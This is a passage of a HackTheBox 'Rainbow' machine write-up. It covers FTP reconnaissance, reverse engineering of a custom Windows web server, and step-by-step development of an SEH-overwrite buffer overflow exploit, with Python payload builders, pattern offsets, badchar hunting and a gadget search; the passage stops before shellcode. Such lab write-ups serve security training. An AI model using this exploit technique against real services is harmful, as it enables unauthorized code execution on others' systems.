(test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n|_clock-skew: mean: 2s, deviation: 0s, median: 2s\n| smb2-time: \n|   date: 2025-10-25T18:44:10\n|_  start_date: N/A\n\nTRACEROUTE (using port 21/tcp)\nHOP RTT       ADDRESS\n1   162.97 ms 10.10.14.1\n2   163.08 ms 10.129.234.171\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 243.61 seconds\n</code></pre> <p>The machine doesn't have ports typically associated with domain controllers exposed.  But it does have FTP exposed, and its allowing anonymous login: </p><pre><code>21/tcp   open  ftp           Microsoft ftpd\n| ftp-syst: \n|_  SYST: Windows_NT\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| 01-18-22  08:22AM                  258 dev.txt\n| 01-18-22  08:30AM                54784 rainbow.exe\n| 01-16-22  01:34PM                  479 restart.ps1\n|_01-16-22  12:14PM       &lt;DIR&gt;          wwwroot\n</code></pre><p></p> <p>Download the files </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/rainbow]\n\u2514\u2500$ ftp rainbow.htb\nConnected to rainbow.htb.\n220 Microsoft FTP Service\nName (rainbow.htb:notroot): Anonymous\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword: \n230 User logged in.\nRemote system type is Windows_NT.\nftp&gt; ls\n229 Entering Extended Passive Mode (|||50101|)\n125 Data connection already open; Transfer starting.\n01-18-22  08:22AM                  258 dev.txt\n01-18-22  08:30AM                54784 rainbow.exe\n01-16-22  01:34PM                  479 restart.ps1\n01-16-22  12:14PM       &lt;DIR&gt;          wwwroot\n226 Transfer complete.\nftp&gt; binary\n200 Type set to I.\nftp&gt; mget *\nmget dev.txt [anpqy?]? a\nPrompting off for duration of mget.\n229 Entering Extended Passive Mode (|||50103|)\n125 Data connection already open; Transfer starting.\n100% |***********************************************************************|   258        2.51 KiB/s    00:00 ETA\n226 Transfer complete.\n258 bytes received in 00:00 (2.47 KiB/s)\n229 Entering Extended Passive Mode (|||50104|)\n125 Data connection already open; Transfer starting.\n100% |***********************************************************************| 54784      172.75 KiB/s    00:00 ETA\n226 Transfer complete.\n54784 bytes received in 00:00 (172.63 KiB/s)\n229 Entering Extended Passive Mode (|||50105|)\n125 Data connection already open; Transfer starting.\n100% |***********************************************************************|   479        4.79 KiB/s    00:00 ETA\n226 Transfer complete.\n479 bytes received in 00:00 (4.76 KiB/s)\n</code></pre><p></p> <p>The <code>dev.txt</code> calls out a <code>restart script</code> and mentions that the application is rotated through ports <code>8080-8090</code> when the webapp crashes. </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/rainbow/dump]\n\u2514\u2500$ cat dev.txt \n* Our webserver has been crashing a lot lately. Instead of touching the code we added a restart script! \n* The server will dynamically pick a port when its default port is unresponsive (8080-8090).\n* We'll fix this later by adding load balancer.\n\n- dev team\n</code></pre><p></p> <p>The <code>restart.ps1</code> discloses that the adjacent <code>rainbow.exe</code> is found at <code>c:\\rainbow\\rainbow.exe</code> </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/rainbow/dump]\n\u2514\u2500$ cat restart.ps1 \nSet-Location -Path c:\\rainbow\nfor(;;){\ntry{\nIf (!(Get-Process -Name rainbow -ErrorAction SilentlyContinue))\n{Invoke-Expression \"C:\\rainbow\\rainbow.exe\" }\n$proc = Get-Process -Name rainbow | Sort-Object -Property ProcessName -Unique -ErrorAction SilentlyContinue\nIf (!$proc -or ($proc.Responding -eq $false) \u2013or ($proc.WorkingSet -GT 200000*1024)) {\n$proc.Kill()\nStart-Sleep -s 10\nInvoke-Expression \"C:\\rainbow\\rainbow.exe\"}\n}\ncatch    {    }\nStart-sleep -s 30\n}\n</code></pre><p></p> <p>Port 80 is a default IIS start page. Port 8080 is the development webapp, its homepage aligns with the <code>index.html</code> found in the <code>wwwroot</code> directory in the FTP share.</p> <p></p> <p>Anonymous access doesn't allow upload to the FTP share, so straight to webshell is off the table.</p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#static-analysis","title":"Static Analysis","text":"<p>I tried analyzing the <code>rainbow.exe</code> using <code>AvaloniaILSpy</code> (https://github.com/icsharpcode/AvaloniaILSpy) but the executable isn't managed code:</p> <p></p> <p>Examining the binary in <code>Ghidra</code>, I find that the binary has a number of imports, one of which is <code>ws2_32.dll</code>.  A good sign the binary features network connection-related operations.</p> <p></p> <p>Following the entrypoint, a stack cookie is set up, and a single function is called, which had another name but I renamed it \"main\", which seems fitting in this context.</p> <p></p> <p>Following the <code>main()</code> function, there is not much to be said about the first two -thirds of the function; likely initialization of the console.  However the near-end of the function starts a webserver, seems to get the address of a loaded module, and an ESI is returned if in good standing. All other scenarios lead to raising SEH exception.  </p> <p></p> <p>Examining the <code>start_webserver()</code> function.</p> <p></p> <p>The function on line 8 I named <code>std_cout</code>, because it seems like that's what its doing is directing stdout to console.</p> <p>Lines 9 and 11  are setting the port range talked about in the <code>dev.txt</code>.   Well, not quite, because that said <code>8080-8090</code>, this clearly won't work for ports <code>8089</code> and <code>8090</code>. </p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/rainbow/dump]\n\u2514\u2500$ echo \"ibase=16; obase=A; 1F90\" | bc\n8080\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/rainbow/dump]\n\u2514\u2500$ echo \"ibase=16; obase=A; 1F99\" | bc\n8089\n</code></pre> <p>Not entirely sure what the function on 14 is doing, my best guess is it is creating and storing a  <code>HostInfo</code>  struct.  The struct isn't used by the server, it's used by the client.</p> <p>The function on line 15 I named <code>socket_bind_server</code> because I found it was calling a bunch of functions by ordinals, those ordinals align with <code>ws2_32</code> and I found them translate in the following order, which I commented inline in the disasm.  </p> <pre><code>/* https://strontic.github.io/xcyclopedia/library/ws2_32.dll-9AB0235EC0B3AAC2A9E 82C18B4677F89.html\n\n/* WSAStartup  115  Exported Function */\n/* socket  23  Exported Function */\n/* WSAGetLastError  111  Exported Function */\n/* htons  9  Exported Functio */\n/* bind  2  Exported Function */\n/* setsockopt  21  Exported Function */\n/* listen  13  Exported Function */\n</code></pre> <p>The other function I named <code>sock_client</code> because I found it to be calling functions by ordinal that align with a spawned socket client: </p><pre><code>/* select  18  Exported Function */\n/* accept  1  Exported Function */\n/* recv  16  Exported Function */\n/* closesocket  3  Exported Function */\n/* WSACleanup  116  Exported Function */\n</code></pre><p></p> <p>The client function will need a closer examination, because this is where there appears to be actual substance to the application.</p> <p>On line 69, I see a zeroing of memory using <code>memset</code>.  This is followed by a <code>recv</code> of  0x1000 bytes, followed by a <code>closesocket</code>.  The <code>local_28</code> variable is passed to the call of <code>closesocket</code>, so it must be a socket handle for the client. Curiously, Lines 76-78 seem to iterate over the <code>recv</code>'d bytes like <code>(int x=0; x&lt;len(recvd); x=x+1)</code> like a for-range type iterator.  However what is strange is the comparison of the indexed value to the <code>local_28</code> client sock fdescriptor.  So we seem to be avoiding a buffer overflow by checking if we reached the fdescriptor at offset +5 of the iterator.  Basically looking ahead at the dword adjacent to the iterator. </p> <p></p> <p>This is where things get interesting, because if we do manage to match to local_28, then a short jump to label <code>LAB_004019cb</code> occurs.  This looks like a shift left operation.  Every iteration, the byte pointed at by <code>local_14[local_18+5]</code> is reassigned the byte pointed at by <code>local_14[local_18+6]</code>.  There is no initializer in the for range loop, here we seem to be finishing off the remainder of the initial for range loop started on line 76. </p> <p>Once the shift operation has finished, the dword pointed at by <code>local_14[4]</code> is decremented by 1.  Then <code>local_30</code> is incremented by 1.   Then a short jump back up to start an <code>accept</code>,  <code>recv</code> all over again (label <code>LAB_00401894</code>).</p> <p></p> <p>If for some reason we can get to the end of the iterator in the initial for range loop without ever matching <code>local_14[local_18 + 5]</code> to the client sock fdescriptor, we enter a whole other branch.</p> <p></p> <p>Real quick, the three short jump labels go to  1. increment local_30 +1 then go back to <code>accept</code>, <code>recv</code> 2. just go back to <code>accept</code>, <code>recv</code> 3. If we made it here, it is because there wasn't actually a client fdescriptor, all paths from here lead to WSACleanup (i.e., maybe lost connection).</p> <p>The first function on line 87 is a slightly recursive function.  More on that in a  second. The second function on line 89 is a check if a VirtualProcessor is available, if not then throw an error. The third function on line 91 is also a check if a VirtualProcessor is available, if not then terminate().</p> <p>So it appears that, if there is something important to do with the received buffer, as all other paths lead away from using the buffer, then it has to happen in the first function found on line 87.  Because after that between the five choices you have two functions that both terminate-equiv, two labels that get a new client recv, and a label that terminates.</p> <p>Lets examine the function on line 87.</p> <p></p> <p>I'm renaming this function <code>depth1</code></p> <p>The <code>_unfancy()</code> function just returns whatever was passed to it.  In this way passed parameters get assigned to function-local variables.</p> <p>The function call on line 18 is, for lack of a better term, obnoxious:</p> <p></p> <p>We can skip close analysis of the first four function calls.  The first one, has deep recursion and at the end of all the recursion is obtaining structs.  I can't help but feel like its setting up for calling an SEH chain.  The other three are freeing memory and returning pointers to memory.  </p> <p>The function of interest is the <code>beginthreadex</code> call on line 39,  it has a function as an argument.  If the application is going to do something interesting with the <code>recv</code> buffer, now is its chance, because the function calls on lines 43, 46, and 49 are either throw an error, or do garbage collection and return.  However with the preamble that leads up to it, it is most likely what calls the SEH chain.</p> <p>Well, and this is a major disappointment.</p> <p>I think that's exactly what it does.</p> <p></p> <p>The first function on line 21 creates a compressed pair (???) , an obvious C++ construct related to optimization of empty memory storage (when empty).</p> <p>The other function calls occurring between lines 21 and 31 are just using an alternate form of, turn arguments into local variables.  This time, from what I can tell, the parameters are those of the parent function's, as nothing was passed to this function.</p> <p>Ah, but the function on line 33 is something else entirely.</p> <p></p> <p>That looks an awful lot like a function pointer exec, save for the three argument being passed to it.  We can see that pointer-to-param1 is being cast as a pointer-to-code-pointer, and then getting called with three arguments.</p> <p>There is nothing left to analyze here at the moment.</p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#dynamic-analysis","title":"Dynamic analysis","text":"<p>Only way forward is to debug it live.  The following can help expedite managing the lifecycle of the binary and attaching windbg to it.  one of the challenges is that the application blocks while its running, and it has console output .  So it has to be started as a background process and output redirected to a file while trying to one-liner starting and attaching to it.</p> <p>Additionally I have set an initial breakpoint at the instruction that calls Ordinal_16 (recv). </p><pre><code>c:\\rainbow&gt;((cmd.exe /c \"taskkill /F /IM rainbow.exe\" &amp;&amp; timeout 3 &amp;&amp; START /B \"\" \"c:\\rainbow\\rainbow.exe\" &gt; c:\\users\\admin\\desktop\\current_thing\\output.txt) || START /B \"\" \"c:\\rainbow\\rainbow.exe\" &gt; c:\\users\\admin\\desktop\\current_thing\\output.txt) &amp;&amp; timeout 3 &amp;&amp; \"C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\windbg.exe\" -WF C:\\windbg_custom.WEW -pn rainbow.exe -c 'bp 0x00401971; g'\n</code></pre><p></p> <p>In <code>IDAPro</code>, that would actually be here:</p> <p></p> <p>To cause the application to hit the breakpoint, I can start with an initial curl command, although this is just a hello world; this is about to become a PoC. </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/rainbow/dump]\n\u2514\u2500$ perl -e \"printf 'A'x0x1020\" | curl -X POST http://192.168.56.100:8080/index.html -d \"fuzzed=$(cat -)\"\n</code></pre><p></p> <p>The convention for calling <code>ws2_32::recv</code></p> <p>https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-recv</p> <pre><code>int WSAAPI recv(\n  [in]  SOCKET s,\n  [out] char   *buf,\n  [in]  int    len,\n  [in]  int    flags\n);\n</code></pre> <p>That means at the breakpoint, the first four dwords on the stack are the arguments. </p><pre><code>Breakpoint 0 hit\neax=00000110 ebx=0022d000 ecx=00000018 edx=0019eca8 esi=0019ff24 edi=0019fdac\neip=00401971 esp=0019ec90 ebp=0019fe08 iopl=0         nv up ei pl nz ac pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216\nrainbow+0x1971:\n00401971 ff15ccb14000    call    dword ptr [rainbow+0xb1cc (0040b1cc)] ds:002b:0040b1cc={WS2_32!recv (774b23a0)}\n\n0:000&gt; dd esp L4\n0019ec90  00000110 0019eca8 00001000 00000000\n</code></pre><p></p> <p>The buffer will get received into <code>0019eca8</code>.  Stepping over the instruction, the <code>recv</code> buffer gets filled. </p><pre><code>0:000&gt; p\neax=00001000 ebx=0022d000 ecx=00000002 edx=0019ebf0 esi=0019ff24 edi=0019fdac\neip=00401977 esp=0019eca0 ebp=0019fe08 iopl=0         nv up ei pl zr na pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246\nrainbow+0x1977:\n00401977 8945cc          mov     dword ptr [ebp-34h],eax ss:002b:0019fdd4=00000000\n0:000&gt; db 0x0019eca8 L4096\n0019eca8  50 4f 53 54 20 2f 69 6e-64 65 78 2e 68 74 6d 6c  POST /index.html\n0019ecb8  20 48 54 54 50 2f 31 2e-31 0d 0a 48 6f 73 74 3a   HTTP/1.1..Host:\n0019ecc8  20 31 39 32 2e 31 36 38-2e 35 36 2e 31 30 30 3a   192.168.56.100:\n0019ecd8  38 30 38 30 0d 0a 55 73-65 72 2d 41 67 65 6e 74  8080..User-Agent\n0019ece8  3a 20 63 75 72 6c 2f 38-2e 31 35 2e 30 0d 0a 41  : curl/8.15.0..A\n0019ecf8  63 63 65 70 74 3a 20 2a-2f 2a 0d 0a 43 6f 6e 74  ccept: */*..Cont\n0019ed08  65 6e 74 2d 4c 65 6e 67-74 68 3a 20 34 31 33 35  ent-Length: 4135\n0019ed18  0d 0a 43 6f 6e 74 65 6e-74 2d 54 79 70 65 3a 20  ..Content-Type: \n0019ed28  61 70 70 6c 69 63 61 74-69 6f 6e 2f 78 2d 77 77  application/x-ww\n0019ed38  77 2d 66 6f 72 6d 2d 75-72 6c 65 6e 63 6f 64 65  w-form-urlencode\n0019ed48  64 0d 0a 0d 0a 66 75 7a-7a 65 64 3d 41 41 41 41  d....fuzzed=AAAA\n0019ed58  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ed68  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n[...]\n[...]\n0019fc98  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019fca8  01 00 00 00 10 01 00 00-10 01 00 00 00 00 00 00  ................\n</code></pre><p></p> <p>As can be seen, this pass was for some 0x1000 bytes.</p> <p>Passing over again, we see that the buffer was zeroed out, and the remaining 0x20 + len(http POST request minus data) bytes was received: </p><pre><code>0:000&gt; p\neax=000000cc ebx=0022d000 ecx=00000002 edx=0019ebf0 esi=0019ff24 edi=0019fdac\neip=00401977 esp=0019eca0 ebp=0019fe08 iopl=0         nv up ei pl zr na pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246\nrainbow+0x1977:\n00401977 8945cc          mov     dword ptr [ebp-34h],eax \n0:000&gt; db 0x0019eca8 L100\n0019eca8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ecb8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ecc8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ecd8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ece8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ecf8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ed08  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ed18  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ed28  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ed38  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ed48  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ed58  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ed68  41 41 41 41 41 41 41 41-41 41 41 41 00 00 00 00  AAAAAAAAAAAA....\n0019ed78  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................\n</code></pre><p></p> <p>The maths </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/rainbow/dump]\n\u2514\u2500$ echo 'ibase=16; obase=A; D64-C68' | bc\n252\n</code></pre><p></p> <p>The http post request added to the request has thrown off initial assumptions.</p> <p>One key discovery is that during testing, I found that the payload only makes it to the functionpointer exec if the connection is kept open.</p> <p>Additionally, I found that the sent data can be max 0x1000 bytes, anything over that resets the buffer (causes it to get zeroed back out and any modulo 0x1000 is received as the buffer)</p> <p>The following has two breakpoints, one at the call for recv, the other at the function call that contains the functionpointer exec.</p> <pre><code>((cmd.exe /c \"taskkill /F /IM rainbow.exe\" &amp;&amp; timeout 3 &amp;&amp; START /B \"\" \"c:\\rainbow\\rainbow.exe\" &gt; c:\\users\\admin\\desktop\\current_thing\\output.txt) || START /B \"\" \"c:\\rainbow\\rainbow.exe\" &gt; c:\\users\\admin\\desktop\\current_thing\\output.txt) &amp;&amp; timeout 3 &amp;&amp; \"C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\windbg.exe\" -WF C:\\windbg_custom.WEW -pn rainbow.exe -c 'bp 0x00401971; bp 0x0040232f; g'\n</code></pre>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#finding-a-crash","title":"Finding a crash","text":"<p>I found that if I debug without any breakpoints, and if I send a POST request with 0x1000 bytes, I get a response back. </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 2 ~/htb/machines/rainbow]\n\u2514\u2500$ perl -e \"printf 'A'x0x1000\" | curl -X POST http://192.168.56.100:8080/index.html -d \"fuzzed=$(cat -)\"\n&lt;html&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/html&gt;\n</code></pre><p></p> <p>If I back that off just by 0x100 bytes, I get AccessViolation. </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 2 ~/htb/machines/rainbow]\n\u2514\u2500$ perl -e \"printf 'A'x0x0f00\" | curl -X POST http://192.168.56.100:8080/index.html -d \"fuzzed=$(cat -)\"\n</code></pre><p></p> <p></p> <p>The exception chain shows that it has been overwritten with As: </p><pre><code>0:003&gt; !exchain\n009bfbe4: 41414141\nInvalid exception stack at 41414141\n</code></pre><p></p> <p>Further, once converted to python,  I found that I can coerce this failure with a very minimal POST body, saving space and eliminating variability.</p> <p></p><pre><code>buf = \"POST / HTTP/1.1\\x0d\\x0aContent-Type: application/x-www-form-urlencoded\\x0d\\x0a\\x0d\\x0a\"\nbuf += (\"\\x41\" * 0xf00)\n</code></pre> ^^ 3908 bytes total<p></p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#finding-the-pattern","title":"Finding the pattern","text":"<p>Retesting with a pattern, with the following buffer.  I'll pass the pattern string in at CLI invocation. </p><pre><code>buf = \"POST / HTTP/1.1\\x0d\\x0aContent-Type: application/x-www-form-urlencoded\\x0d\\x0a\\x0d\\x0a\"\nbuf += sys.argv[2][:0xf00]\n</code></pre><p></p> <p>Called like: </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 2 ~/htb/machines/rainbow]\n\u2514\u2500$ ./poc.py 192.168.56.100:8080 $(msf-pattern_create -l 0x0f00)\n</code></pre><p></p> <p>Identify the pattern found in the exception stack: </p><pre><code>0:003&gt; !exchain\n009cfbe4: 77413177\nInvalid exception stack at 41307741\n</code></pre><p></p> <p>Identify the offset </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 2 ~/htb/machines/rainbow]\n\u2514\u2500$ msf-pattern_offset -l 0x0f00 -q 77413177\n[*] Exact match at offset 664\n</code></pre><p></p> <p>Buffer be like </p><pre><code>    total_len = 3908\n    crash_len = 664\n    head = \"POST / HTTP/1.1\\x0d\\x0aContent-Type: application/x-www-form-urlencoded\\x0d\\x0a\\x0d\\x0a\"\n    sled1 = (\"\\x40\" * crash_len)\n    SEH = (\"\\x41\" * 4)\n    tail = (\"\\x42\" * (total_len - sum([len(x) for x in [\n        head,\n        sled1,\n        SEH\n    ]])))\n    buf = f\"{head}{sled1}{SEH}{tail}\"\n</code></pre><p></p> <p>Now I am aligned </p><pre><code>0:003&gt; !exchain\n009dfbe4: 41414141\nInvalid exception stack at 40404040\n</code></pre><p></p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#finding-badchars","title":"Finding Badchars","text":"<p>Real quick though, test for badchars.  I have a function I built for that:</p> <pre><code>badchars = \"\"\ndef gen_badchars(bc, start=\"\\x01\", end=\"\\xff\"):\n    s_int = ord(start)\n    e_int = ord(end)+1\n    BC = bytearray(range(s_int,e_int)).decode('latin-1')\n    for item in bc:\n        BC = BC.replace(item,'')\n    return BC\n</code></pre> <p>I use the above function and variable for massaging out badchars, by creating a string containing all bytes within a certain range.  I typically just start out with null to -1 as the range, but sometime I'd know beforehand about certain badchars, in this case I have no clue. </p> <pre><code>    total_len = 3908\n    crash_len = 664\n    head = \"POST / HTTP/1.1\\x0d\\x0aContent-Type: application/x-www-form-urlencoded\\x0d\\x0a\\x0d\\x0a\"\n    sled1 = (\"\\x40\" * crash_len)\n    SEH = (\"\\x41\" * 4)\n    bad = gen_badchars(badchars, start=\"\\x00\", end=\"\\xff\")\n    tail = (\"\\x42\" * (total_len - sum([len(x) for x in [\n        head,\n        sled1,\n        SEH,\n        bad\n    ]])))\n    buf = f\"{head}{sled1}{SEH}{bad}{tail}\"\n</code></pre> <p>Null is for sure bad.  </p><pre><code>0:003&gt; !exchain\n009ff8e4: rainbow+a040 (0040a040)\n009ff924: rainbow+a040 (0040a040)\n009ffbe4: 41414141\nInvalid exception stack at 40404040\n0:003&gt; db 0x009ffbe4 L0n256\n009ffbe4  40 40 40 40 41 41 41 41-05 00 00 00 f0 fe 9f 00  @@@@AAAA........\n009ffbf4  b3 26 40 00 28 60 6d 00-b8 60 6d 00 b8 60 6d 00  .&amp;@.(`m..`m..`m\n</code></pre><p></p> <p>So I add <code>\\x00</code> to the badchars var above the <code>gen_badchars</code> function, rinse and repeat.</p> <p>This time I had to go hunting for it a little bit, alignment was thrown off. </p><pre><code>0:003&gt; db 0x00a0fbe4-0x2b0 L0n280\n00a0f934  a3 2b 40 00 50 f9 a0 00-b8 b3 40 00 b8 8c 62 00  .+@.P.....@...b.\n00a0f944  10 3d 61 00 c0 20 40 00-10 3d 61 00 0b 0c 0d 0e  .=a.. @..=a.....\n00a0f954  0f 10 11 12 13 14 15 16-17 18 19 1a 1b 1c 1d 1e  ................\n00a0f964  1f 20 21 22 23 24 25 26-27 28 29 2a 2b 2c 2d 2e  . !\"#$%&amp;'()*+,-.\n00a0f974  2f 30 31 32 33 34 35 36-37 38 39 3a 3b 3c 3d 3e  /0123456789:;&lt;=&gt;\n00a0f984  3f 40 41 42 43 44 45 46-47 48 49 4a 4b 4c 4d 4e  ?@ABCDEFGHIJKLMN\n00a0f994  4f 50 51 52 53 54 55 56-57 58 59 5a 5b 5c 5d 5e  OPQRSTUVWXYZ[\\]^\n00a0f9a4  5f 60 61 62 63 64 65 66-67 68 69 6a 6b 6c 6d 6e  _`abcdefghijklmn\n00a0f9b4  6f 70 71 72 73 74 75 76-77 78 79 7a 7b 7c 7d 7e  opqrstuvwxyz{|}~\n00a0f9c4  7f 80 81 82 83 84 85 86-87 88 89 8a 8b 8c 8d 8e  ................\n00a0f9d4  8f 90 91 92 93 94 95 96-97 98 99 9a 9b 9c 9d 9e  ................\n00a0f9e4  9f a0 a1 a2 a3 a4 a5 a6-a7 a8 a9 aa ab ac ad ae  ................\n00a0f9f4  af b0 b1 b2 b3 b4 b5 b6-b7 b8 b9 ba bb bc bd be  ................\n00a0fa04  bf c0 c1 c2 c3 c4 c5 c6-c7 c8 c9 ca cb cc cd ce  ................\n00a0fa14  cf d0 d1 d2 d3 d4 d5 d6-d7 d8 d9 da db dc dd de  ................\n00a0fa24  df e0 e1 e2 e3 e4 e5 e6-e7 e8 e9 ea eb ec ed ee  ................\n00a0fa34  ef f0 f1 f2 f3 f4 f5 f6-f7 f8 f9 fa fb fc fd fe  ................\n00a0fa44  ff 42 42 42 42 42 42 42                          .BBBBBBB\n</code></pre><p></p> <p>This is a hard one to decipher, because of the way the rest of the badchars came back afterwards, and they were found way out of alignment.  But I think <code>\\x0a</code> is a badchar.  So adding it.</p> <p>Yes, that was correct.  All is well now </p><pre><code>0:003&gt; !exchain\n00a1fbe4: 41414141\nInvalid exception stack at 40404040\n0:003&gt; db 0x00a1fbe4 L0x256\n00a1fbe4  40 40 40 40 41 41 41 41-01 02 03 04 05 06 07 08  @@@@AAAA........\n00a1fbf4  09 0b 0c 0d 0e 0f 10 11-12 13 14 15 16 17 18 19  ................\n00a1fc04  1a 1b 1c 1d 1e 1f 20 21-22 23 24 25 26 27 28 29  ...... !\"#$%&amp;'()\n00a1fc14  2a 2b 2c 2d 2e 2f 30 31-32 33 34 35 36 37 38 39  *+,-./0123456789\n00a1fc24  3a 3b 3c 3d 3e 3f 40 41-42 43 44 45 46 47 48 49  :;&lt;=&gt;?@ABCDEFGHI\n00a1fc34  4a 4b 4c 4d 4e 4f 50 51-52 53 54 55 56 57 58 59  JKLMNOPQRSTUVWXY\n00a1fc44  5a 5b 5c 5d 5e 5f 60 61-62 63 64 65 66 67 68 69  Z[\\]^_`abcdefghi\n00a1fc54  6a 6b 6c 6d 6e 6f 70 71-72 73 74 75 76 77 78 79  jklmnopqrstuvwxy\n00a1fc64  7a 7b 7c 7d 7e 7f 80 81-82 83 84 85 86 87 88 89  z{|}~...........\n00a1fc74  8a 8b 8c 8d 8e 8f 90 91-92 93 94 95 96 97 98 99  ................\n00a1fc84  9a 9b 9c 9d 9e 9f a0 a1-a2 a3 a4 a5 a6 a7 a8 a9  ................\n00a1fc94  aa ab ac ad ae af b0 b1-b2 b3 b4 b5 b6 b7 b8 b9  ................\n00a1fca4  ba bb bc bd be bf c0 c1-c2 c3 c4 c5 c6 c7 c8 c9  ................\n00a1fcb4  ca cb cc cd ce cf d0 d1-d2 d3 d4 d5 d6 d7 d8 d9  ................\n00a1fcc4  da db dc dd de df e0 e1-e2 e3 e4 e5 e6 e7 e8 e9  ................\n00a1fcd4  ea eb ec ed ee ef f0 f1-f2 f3 f4 f5 f6 f7 f8 f9  ................\n00a1fce4  fa fb fc fd fe ff 42 42-42 42 42 42 42 42 42 42  ......BBBBBBBBBB\n</code></pre><p></p> <p>Final badcchars: </p><pre><code>badchars = \"\\x00\\x0a\"\n</code></pre><p></p> <p>Nothing uses the variable beyond hunting for badchars.</p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#finding-poppopret","title":"Finding PopPopRet","text":"<p>Of note, only the rainbow binary will do.  Everything else has DEP and ASLR enabled, and, why fight them if you don't have to. </p><pre><code>0:003&gt; !load narly\n\n      __s|I}*!{a.                        ._s,aan2*a\n     _wY1+~-    )S,                     .ae\"~=:...:X\n   .vXl+:.       -4c                   &lt;2+=|==::..:d\n   vvi=;..        -?o,                =2=+==:::...=d\n  )nv=:.            )5,              .2=--.......-=d\n  ue+::              -*s             &lt;c .        .=d\n  m&gt;==::..     ._,     &lt;s,           )c           :d\n  #==viii|===; {Xs=,    -{s          )c         ..:d\n  Z;{nnonnvvii;v(-{%=.    ~s,        )e:====||iiv%=d\n  X={oooonvvIl;3;  -{%,    -*&gt;       )2&lt;onnnnvnnnn&gt;d\n  X=)vvvvIliii:3;    -!s.   :)s.     )e&lt;oonvlllllIid\n  X=&lt;lllliii|=:n;      -1c.  +|1,    )z&lt;nvii||+|+|vX\n  S=&lt;lli|||=:: n;        \"nc  -s%;   )c=ovl|++==+=vo\n  X=&lt;i||+=; . .n`          \"1&gt;.-{%i. )c&lt;Xnnli||++=vn\n  X=iii&gt;==-.  :o`            \"1,:+iI,)c:Sonnvli||=v(\n  X&gt;{ii+;:-  .u(               \"o,-{Iw(:nvvvllii=v2\n  S=i||;:. .=u(                 -!o,+I(:iiillii|ie`\n  2&gt;v|==__su?`                    -?o,-:==||iisv\"\n  {nvnI!\"\"~                         -!sasvv}\"\"`\n\n             by Nephi Johnson (d0c_s4vage)\n                      N for gnarly!\n\nAvailable commands:\n\n    !nmod     - display /SafeSEH, /GS, DEP, and ASLR info for\n                all loaded modules\n\n0:003&gt; !nmod\n00400000 00411000 rainbow              /SafeSEH OFF /GS            c:\\rainbow\\rainbow.exe\n6f980000 6f995000 VCRUNTIME140         /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\SYSTEM32\\VCRUNTIME140.dll\n6f9a0000 6fa0d000 MSVCP140             /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\SYSTEM32\\MSVCP140.dll\n74e80000 74e8f000 kernel_appcore       /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\SysWOW64\\kernel.appcore.dll\n74fc0000 75012000 mswsock              /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\system32\\mswsock.dll\n753c0000 7547f000 msvcrt               /SafeSEH ON  /GS 